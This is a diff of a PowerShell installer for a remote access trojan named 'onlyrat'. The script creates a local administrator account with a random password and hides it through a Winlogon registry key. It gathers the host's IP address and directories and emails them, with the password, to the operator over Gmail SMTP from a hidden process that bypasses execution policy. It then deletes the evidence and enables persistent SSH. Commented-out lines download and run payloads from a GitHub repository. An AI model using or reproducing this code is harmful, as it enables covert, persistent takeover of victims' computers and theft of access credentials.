@@ -23,8 +23,10 @@ function create_account {
 # create admin user
 $xf061name = "onlyrat"
 $xf061RandPass = random_text(Get-Random -Minimum 6 -Maximum 19)
+Remove-LocalUser -Name "$xf061name"
 $xf061pass = (ConvertTo-SecureString $xf061RandPass -AsPlainText -Force)
 create_account -xf061name $xf061name -xf061pass $xf061pass
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $xf061name -Value 0 -Type DWORD -Force
 
 # Variables
 $directory = random_text(5)
@@ -32,21 +34,22 @@ $temp_dir = "$env:TEMP\$directory"
 # save current directory
 $curr_dir = Get-Location|%{$_.Path}
 
-$email = Get-Content .\email.txt
-$password = Get-Content .\password.txt
+$email = Get-Content .\KHPWMpTitfZ.txt
+$password = Get-Content .\oSyEZsgTWIU.txt
 $config_file = "$env:username.rat"
-$ip = (Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|select -Last 1
+$ip = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 
 # generate config file
-Add-Content -Path $config_file -Value $ip
-Add-Content -Path $config_file -Value $xf061RandPass
-Add-Content -Path $config_file -Value $temp_dir
+Add-Content -Path $config_file -Value $ip               #ip
+Add-Content -Path $config_file -Value $xf061RandPass    #pass
+Add-Content -Path $config_file -Value $temp_dir         #working dir
+Add-Content -Path $config_file -Value $curr_dir         #startup dir
 # Send Initial reconnaissance
 powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $email -to $email -subject $config_file -attachments $config_file -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $email ,(convertto-securestring -string '$password' -asplaintext -force))}"
 
 # cleanup your credentials and reconnaissance files
-Remove-Item .\email.txt -Force
-Remove-Item .\password.txt -Force
+Remove-Item .\KHPWMpTitfZ.txt -Force
+Remove-Item .\oSyEZsgTWIU.txt -Force
 Remove-Item .\$config_file -Force
 
 
@@ -55,12 +58,12 @@ mkdir $temp_dir
 cd $temp_dir
 
 # Download registry to hide local admin
-$reg_file = random_text(Get-Random -Minimum 6 -Maximum 13)
-iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/admin.reg" -OutFile ".\$reg_file.reg"
+# $reg_file = random_text(Get-Random -Minimum 6 -Maximum 13)
+# iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/admin.reg" -OutFile ".\$reg_file.reg"
 
 # Download VbScript file which will automate our registry entry
-$vbs_file = random_text(Get-Random -Minimum 6 -Maximum 13)
-iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/confirm.vbs" -OutFile ".\$vbs_file.vbs"
+# $vbs_file = random_text(Get-Random -Minimum 6 -Maximum 13)
+# iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/confirm.vbs" -OutFile ".\$vbs_file.vbs"
 
 # enable persistent ssh
 # Install the OpenSSH Client
@@ -79,7 +82,7 @@ Set-Service -Name sshd -StartupType Automatic
 # Get-NetFirewallRule -Name *ssh*
 
 # execute the registry entry process
-powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"
+# powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"
 
 # move to users to hide our onlyrat local admin
 cd C:\Users
